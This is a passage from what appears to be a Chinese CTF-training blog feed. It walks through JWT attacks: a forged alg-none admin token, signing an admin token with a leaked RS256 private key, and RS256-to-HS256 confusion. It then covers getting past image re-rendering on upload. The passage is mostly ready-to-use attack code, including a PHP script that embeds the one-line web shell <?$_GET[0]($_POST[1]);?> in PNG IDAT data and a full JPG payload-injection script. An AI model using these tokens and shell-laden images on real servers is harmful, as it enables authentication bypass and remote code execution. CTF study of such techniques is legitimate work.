class="hljs-number">0</span>In<span class="hljs-number">0</span>.<span class="hljs-number">1</span>HzZE_bkrgzE<span class="hljs-number">12</span>m<span class="hljs-number">27</span>Odw_bKZvGA<span class="hljs-number">4</span>ytwP<span class="hljs-number">3</span>mLXvYIsQrk<br></code></pre></td></tr></table></figure><p>可以分段base64也可以使用<a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819003915180.png"></p><p>最后面的<strong>VERIFY SIGNATURE</strong>修改无法解出来，因为设置了签证为空，删除即可，直接将第二个点前的数据进行解码</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819004041753.png"></p><p>经验，给补上一个<code>=</code></p><p>将<code>alg</code>设置为<code>none</code>，将<code>role</code>设置为<code>admin</code></p><p>得到payload：</p><blockquote><p>token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6IjEyMyIsInBhc3N3b3JkIjoiMTIzIiwicm9sZSI6ImFkbWluIn0.</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819011534028.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819011621792.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819011635058.png"></p><h3 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819012520913.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819013136910.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819013309069.png"></p><h3 id="非对称RS256私钥生成jwt"><a href="#非对称RS256私钥生成jwt" class="headerlink" title="非对称RS256私钥生成jwt"></a>非对称RS256私钥生成jwt</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> privateKey = fs.readFileSync(process.cwd()+<span class="hljs-string">&#x27;//public//private.key&#x27;</span>);<br>  <span class="hljs-keyword">var</span> token = jwt.sign(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br>  res.cookie(<span class="hljs-string">&#x27;auth&#x27;</span>,token);<br>  res.end(<span class="hljs-string">&#x27;where is flag?&#x27;</span>);<br>  <br>&#125;);<br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req,res,next</span>)</span>&#123;<br><span class="hljs-keyword">var</span> flag=<span class="hljs-string">&quot;flag_here&quot;</span>;<br>res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br><span class="hljs-keyword">var</span> auth = req.cookies.auth;<br><span class="hljs-keyword">var</span> cert = fs.readFileSync(process.cwd()+<span class="hljs-string">&#x27;//public/public.key&#x27;</span>);  <span class="hljs-comment">// get public key</span><br>jwt.verify(auth, cert, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, decoded</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(decoded.user===<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>  res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.end(<span class="hljs-string">&#x27;you are not admin&#x27;</span>);<br>  &#125;<br>&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>发现公钥私钥都在public文件夹下，下载私钥，利用私钥生成jwt</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privatekey = fs.readFileSync(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.sign(&#123;<span class="hljs-attr">user</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,privatekey,&#123;<span class="hljs-attr">algorithm</span>:<span class="hljs-string">&#x27;RS256&#x27;</span>&#125;);<br><span class="hljs-built_in">console</span>.log(token);<br></code></pre></td></tr></table></figure><p>覆盖Cookie[auth]即可</p><h3 id="对称HS256公钥生成jwt"><a href="#对称HS256公钥生成jwt" class="headerlink" title="对称HS256公钥生成jwt"></a>对称HS256公钥生成jwt</h3><p>下载公钥，更改非对称算法RS256为HS256</p><p>利用上面脚本生成jwt，覆盖即可</p><h2 id="文件上传之二次渲染"><a href="#文件上传之二次渲染" class="headerlink" title="文件上传之二次渲染"></a>文件上传之二次渲染</h2><ul><li>PNG</li></ul><p>上传图片马，打开文件预览后下载，发现一句话已经不在，对此文件<strong>写入IDAT数据块</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;1.png&#x27;</span>);  <span class="hljs-comment">//要修改的图片的路径</span><br><span class="hljs-comment">/* 木马内容</span><br><span class="hljs-comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">GET:0=system</span><br><span class="hljs-comment">POST:1=ls</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后上传，传参后下载新加载的图片，查看图片的代码即可</p><p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">https://www.fujieace.com/penetration-test/upload-labs-pass-16.html</a></p><ul><li>JPG</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;gd&#x27;</span>) || !function_exists(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = file_get_contents(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;readByte() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;readByte();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;readShort() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;skip(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                checkImage(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        substr(<br>                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    unlink(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        imagecreatefromjpeg(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            unlink(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>) || !is_file(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-keyword">$this</span>-&gt;binData = file_get_contents(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;size = strlen(<span class="hljs-keyword">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">$this</span>-&gt;size - strlen(<span class="hljs-keyword">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;eof()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> ord(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-keyword">$this</span>-&gt;binData||(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2020/11/20/ssrf/"/>
    <url>/2020/11/20/ssrf/</url>
    
